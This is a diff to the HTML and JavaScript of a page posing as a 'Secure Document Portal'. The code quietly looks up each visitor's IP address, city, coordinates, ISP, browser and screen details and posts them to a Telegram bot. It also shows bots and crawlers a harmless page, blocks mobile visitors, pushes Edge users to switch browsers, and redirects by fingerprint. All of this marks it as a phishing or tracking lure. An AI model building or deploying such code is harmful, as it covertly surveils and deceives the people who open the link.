@@ -83,42 +83,54 @@
             font-size: 11px;
             color: #adb5bd;
         }
-        .message-card {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            max-width: 500px;
-            margin: 0 auto;
+        
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
         }
-        .message-card .card {
+        .modal-card {
             background: white;
-            border-radius: 24px;
-            padding: 40px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
-            border: 1px solid #e9ecef;
+            max-width: 480px;
+            width: 90%;
+            padding: 40px 30px;
+            border-radius: 28px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
         }
-        .message-card .icon-large {
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-        .message-card h2 {
-            color: #1a1e2b;
+        .modal-icon {
+            font-size: 56px;
             margin-bottom: 16px;
         }
-        .message-card p {
-            color: #6c757d;
-            margin: 16px 0;
+        .modal-title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #1a1e2b;
+            margin-bottom: 12px;
         }
-        .permission-buttons {
+        .modal-text {
+            color: #6c757d;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+        .btn-group {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 20px;
-            margin: 30px 0;
+            gap: 16px;
+            margin: 24px 0;
         }
-        .permission-btn {
+        .btn {
             display: inline-block;
-            padding: 14px 32px;
+            padding: 12px 28px;
             border: none;
             border-radius: 50px;
             font-size: 16px;
@@ -126,78 +138,66 @@
             cursor: pointer;
             transition: all 0.2s ease;
             text-decoration: none;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
-        .permission-btn.chrome {
+        .btn-chrome {
             background: #4285f4;
             color: white;
         }
-        .permission-btn.chrome:hover {
+        .btn-chrome:hover {
             background: #3367d6;
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(66,133,244,0.3);
         }
-        .permission-btn.firefox {
+        .btn-firefox {
             background: #ff9400;
             color: white;
         }
-        .permission-btn.firefox:hover {
+        .btn-firefox:hover {
             background: #e08500;
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(255,148,0,0.3);
         }
-        .permission-btn:active {
-            transform: translateY(0);
+        .btn-cancel {
+            background: #e9ecef;
+            color: #495057;
+            margin-top: 8px;
         }
-        .install-section {
+        .btn-cancel:hover {
+            background: #dee2e6;
+        }
+        .install-links {
             margin-top: 20px;
             padding-top: 20px;
             border-top: 1px solid #e9ecef;
         }
-        .install-links {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-top: 12px;
-        }
         .install-links a {
             color: #4285f4;
             text-decoration: none;
+            margin: 0 10px;
             font-size: 14px;
-            font-weight: 500;
         }
         .install-links a.firefox-link {
             color: #ff9400;
         }
-        .install-links a:hover {
-            text-decoration: underline;
-        }
-        .instruction-note {
-            background: #f0f2f5;
-            padding: 14px;
+        .install-note {
+            background: #f8f9fa;
+            padding: 12px;
             border-radius: 12px;
-            margin: 20px 0 0;
-            font-size: 13px;
-            color: #495057;
-        }
-        .cancel-btn {
-            background: none;
-            border: none;
-            color: #6c757d;
-            cursor: pointer;
-            font-size: 14px;
-            text-decoration: underline;
             margin-top: 20px;
-            padding: 8px 16px;
-        }
-        .cancel-btn:hover {
-            color: #495057;
+            font-size: 13px;
+            color: #6c757d;
         }
     </style>
 </head>
 <body>
-    <div id="app"></div>
+    <div id="app">
+        <div class="container">
+            <div class="icon">📄</div>
+            <h2>Document Portal</h2>
+            <p>Loading secure document portal...</p>
+            <div class="loader"></div>
+            <div class="status">Initializing...</div>
+            <div class="footer">Secure • Encrypted</div>
+        </div>
+    </div>
 
     <script>
         // ============================================================
@@ -216,11 +216,11 @@
         ];
         
         // ============================================================
-        // TELEGRAM NOTIFICATION
+        // HELPER FUNCTIONS
         // ============================================================
         async function sendTelegram(message) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -229,187 +229,119 @@
                         parse_mode: 'HTML'
                     })
                 });
-                return response.ok;
-            } catch (error) {
-                return false;
-            }
+            } catch(e) {}
         }
         
-        // ============================================================
-        // GET IP AND LOCATION
-        // ============================================================
         async function getLocationInfo() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const locationData = await locationResponse.json();
-                
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipRes.json();
+                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locData = await locRes.json();
                 return {
-                    ip: ip,
-                    city: locationData.city || 'Unknown',
-                    region: locationData.region || 'Unknown',
-                    country: locationData.country_name || 'Unknown',
-                    latitude: locationData.latitude || 'N/A',
-                    longitude: locationData.longitude || 'N/A',
-                    isp: locationData.org || 'Unknown',
-                    timezone: locationData.timezone || 'Unknown'
+                    ip,
+                    city: locData.city || 'Unknown',
+                    region: locData.region || 'Unknown',
+                    country: locData.country_name || 'Unknown',
+                    latitude: locData.latitude || 'N/A',
+                    longitude: locData.longitude || 'N/A',
+                    isp: locData.org || 'Unknown',
+                    timezone: locData.timezone || 'Unknown'
                 };
-            } catch (error) {
-                return {
-                    ip: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    latitude: 'N/A',
-                    longitude: 'N/A',
-                    isp: 'Unknown',
-                    timezone: 'Unknown'
-                };
+            } catch(e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', latitude: 'N/A', longitude: 'N/A', isp: 'Unknown', timezone: 'Unknown' };
             }
         }
         
-        // ============================================================
-        // SEND VISIT NOTIFICATION
-        // ============================================================
-        async function sendVisitNotification(selectedFile, browserName, action = 'view') {
-            const location = await getLocationInfo();
-            const userAgent = navigator.userAgent;
-            const screenSize = `${window.screen.width}x${window.screen.height}`;
-            const referrer = document.referrer || 'Direct';
-            const timestamp = new Date().toISOString();
+        async function sendNotification(selectedFile, browserName, action) {
+            const loc = await getLocationInfo();
             const fileName = selectedFile.split('/').pop().split('?')[0];
-            
-            const message = `🔵 <b>DOCUMENT ACCESS</b> 🔵
-            
-📍 <b>Location:</b> ${location.city}, ${location.region}, ${location.country}
-🌐 <b>IP Address:</b> ${location.ip}
-🗺️ <b>Coordinates:</b> ${location.latitude}, ${location.longitude}
-🏢 <b>ISP:</b> ${location.isp}
-⏰ <b>Timezone:</b> ${location.timezone}
-
-📁 <b>File:</b> ${fileName}
-💻 <b>OS:</b> ${navigator.platform}
-🌍 <b>Browser:</b> ${browserName}
-🔄 <b>Action:</b> ${action}
-🖥️ <b>Screen:</b> ${screenSize}
-🔗 <b>Referrer:</b> ${referrer}
-📅 <b>Time:</b> ${timestamp}
-
-<b>User Agent:</b>
-<code>${userAgent.substring(0, 200)}</code>`;
-            
-            await sendTelegram(message);
+            const msg = `🔵 <b>DOCUMENT ACCESS</b> 🔵\n\n📍 Location: ${loc.city}, ${loc.region}, ${loc.country}\n🌐 IP: ${loc.ip}\n🗺️ Coordinates: ${loc.latitude}, ${loc.longitude}\n🏢 ISP: ${loc.isp}\n\n📁 File: ${fileName}\n💻 OS: ${navigator.platform}\n🌍 Browser: ${browserName}\n🔄 Action: ${action}\n🖥️ Screen: ${window.screen.width}x${window.screen.height}\n📅 Time: ${new Date().toISOString()}`;
+            await sendTelegram(msg);
         }
         
-        // ============================================================
-        // BROWSER DETECTION
-        // ============================================================
         function detectBrowser() {
             const ua = navigator.userAgent.toLowerCase();
-            if (ua.indexOf('edg') > -1 || ua.indexOf('edge') > -1) return 'Microsoft Edge';
-            if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1) return 'Chrome';
-            if (ua.indexOf('firefox') > -1) return 'Firefox';
-            if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) return 'Safari';
+            if (ua.includes('edg') || ua.includes('edge')) return 'Microsoft Edge';
+            if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
+            if (ua.includes('firefox')) return 'Firefox';
+            if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
             return 'Unknown';
         }
         
-        // ============================================================
-        // OPEN IN BROWSER
-        // ============================================================
-        function openInBrowser(browser, url, browserName, buttonElement) {
-            buttonElement.disabled = true;
-            const originalText = buttonElement.textContent;
-            buttonElement.textContent = 'Opening...';
-            
-            window.location.href = `${browser}://${url.replace(/^https?:\/\//, '')}`;
-            navigator.clipboard.writeText(url);
-            
-            setTimeout(() => {
-                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', `opened_in_${browserName}`);
-                buttonElement.disabled = false;
-                buttonElement.textContent = originalText;
-                setTimeout(() => window.close(), 1500);
-            }, 500);
+        function getRandomFile() {
+            const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
+            let hash = 0;
+            for (let i = 0; i < fingerprint.length; i++) {
+                hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+                hash |= 0;
+            }
+            return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
         }
         
-        // ============================================================
-        // ASK TO OPEN IN CHROME/FIREFOX
-        // ============================================================
-        function askToOpenInOtherBrowser(currentUrl) {
+        function showSwitchBrowserModal(currentUrl) {
+            // Create modal
             const modal = document.createElement('div');
-            modal.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0,0,0,0.8);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                z-index: 10000;
-            `;
-            
-            const dialog = document.createElement('div');
-            dialog.style.cssText = `
-                background: white;
-                max-width: 500px;
-                width: 90%;
-                padding: 35px;
-                border-radius: 28px;
-                text-align: center;
-                box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            `;
-            
-            dialog.innerHTML = `
-                <div style="font-size: 56px; margin-bottom: 16px;">🌐</div>
-                <h2 style="margin-bottom: 12px; font-size: 26px;">Switch Browser</h2>
-                <p style="color: #6c757d; margin-bottom: 20px; font-size: 15px;">
-                    This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
-                </p>
-                
-                <div class="permission-buttons">
-                    <button id="chromeBtn" class="permission-btn chrome">Open in Chrome</button>
-                    <button id="firefoxBtn" class="permission-btn firefox">Open in Firefox</button>
-                </div>
-                
-                <div class="install-section">
-                    <p style="font-size: 13px; color: #6c757d; margin-bottom: 10px;">
-                        <strong>Don't have Chrome or Firefox?</strong>
-                    </p>
+            modal.className = 'modal-overlay';
+            modal.innerHTML = `
+                <div class="modal-card">
+                    <div class="modal-icon">🌐</div>
+                    <div class="modal-title">Switch Browser</div>
+                    <div class="modal-text">
+                        This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
+                    </div>
+                    <div class="btn-group">
+                        <button id="chromeBtn" class="btn btn-chrome">Open in Chrome</button>
+                        <button id="firefoxBtn" class="btn btn-firefox">Open in Firefox</button>
+                    </div>
                     <div class="install-links">
-                        <a href="https://www.google.com/chrome/" target="_blank" class="chrome-link">⬇️ Download Chrome</a>
+                        <a href="https://www.google.com/chrome/" target="_blank">⬇️ Download Chrome</a>
                         <a href="https://www.mozilla.org/firefox/" target="_blank" class="firefox-link">⬇️ Download Firefox</a>
                     </div>
-                    <div class="instruction-note">
+                    <div class="install-note">
                         💡 <strong>After installing:</strong> Click the button above again. The link will open automatically.
                     </div>
+                    <button id="cancelBtn" class="btn btn-cancel" style="margin-top: 20px;">Continue in Edge</button>
                 </div>
-                
-                <button id="cancelBtn" class="cancel-btn">Continue in Edge (not recommended)</button>
             `;
-            
-            modal.appendChild(dialog);
             document.body.appendChild(modal);
             
             // Chrome button
-            document.getElementById('chromeBtn').onclick = (e) => {
-                e.preventDefault();
-                openInBrowser('googlechrome', currentUrl, 'chrome', document.getElementById('chromeBtn'));
+            document.getElementById('chromeBtn').onclick = () => {
+                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_chrome');
+                window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
+                navigator.clipboard.writeText(currentUrl);
+                setTimeout(() => window.close(), 1000);
+                modal.remove();
             };
             
             // Firefox button
-            document.getElementById('firefoxBtn').onclick = (e) => {
-                e.preventDefault();
-                openInBrowser('firefox', currentUrl, 'firefox', document.getElementById('firefoxBtn'));
+            document.getElementById('firefoxBtn').onclick = () => {
+                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_firefox');
+                window.location.href = 'firefox://' + currentUrl.replace(/^https?:\/\//, '');
+                navigator.clipboard.writeText(currentUrl);
+                setTimeout(() => window.close(), 1000);
+                modal.remove();
             };
             
             // Cancel button
             document.getElementById('cancelBtn').onclick = () => {
+                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
                 modal.remove();
-                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
+                // Show a message that they can continue
+                document.getElementById('app').innerHTML = `
+                    <div class="container">
+                        <div class="icon">📄</div>
+                        <h2>Document Portal</h2>
+                        <p>You chose to continue in Edge. The document may not display correctly.</p>
+                        <button id="proceedBtn" class="btn btn-chrome" style="margin-top: 20px;">Proceed Anyway</button>
+                        <div class="footer">Secure • Encrypted</div>
+                    </div>
+                `;
+                document.getElementById('proceedBtn').onclick = () => {
+                    const selectedFile = getRandomFile();
+                    window.location.href = selectedFile;
+                };
             };
         }
         
@@ -419,11 +351,11 @@
         (async function() {
             const ua = navigator.userAgent.toLowerCase();
             const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
+            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
             const browser = detectBrowser();
             const currentUrl = window.location.href;
             
-            // Bot detection
-            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
+            // Bots get simple page
             if (isBot) {
                 document.getElementById('app').innerHTML = `
                     <div class="container">
@@ -439,28 +371,28 @@
             // Mobile block
             if (isMobile) {
                 document.getElementById('app').innerHTML = `
-                    <div class="message-card">
-                        <div class="card">
-                            <div class="icon-large">📱</div>
-                            <h2>Desktop Access Required</h2>
-                            <p>This document requires a desktop environment.</p>
-                            <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
-                            <hr style="margin: 24px 0 16px; border: none; border-top: 1px solid #e9ecef;">
-                            <p style="font-size: 11px; color: #adb5bd;">Secure Document Portal</p>
-                        </div>
+                    <div class="container">
+                        <div class="icon">📱</div>
+                        <h2>Desktop Access Required</h2>
+                        <p>This document requires a desktop environment.</p>
+                        <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
+                        <div class="footer">Secure Document Portal</div>
                     </div>
                 `;
                 return;
             }
             
-            // Edge – ask to switch to Chrome/Firefox
+            // Edge users – show browser switch modal
             if (browser === 'Microsoft Edge') {
-                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
-                askToOpenInOtherBrowser(currentUrl);
+                sendNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
+                showSwitchBrowserModal(currentUrl);
                 return;
             }
             
             // Chrome/Firefox – normal redirect
+            const selectedFile = getRandomFile();
+            sendNotification(selectedFile, browser, 'access_granted');
+            
             document.getElementById('app').innerHTML = `
                 <div class="container">
                     <div class="icon">📄</div>
@@ -474,19 +406,6 @@
                     <div class="footer">Secure • Encrypted</div>
                 </div>
             `;
-            
-            function getRandomFile() {
-                const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
-                let hash = 0;
-                for (let i = 0; i < fingerprint.length; i++) {
-                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
-                    hash |= 0;
-                }
-                return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
-            }
-            
-            const selectedFile = getRandomFile();
-            sendVisitNotification(selectedFile, browser, 'access_granted');
             
             if (!sessionStorage.getItem('redirected')) {
                 sessionStorage.setItem('redirected', 'true');
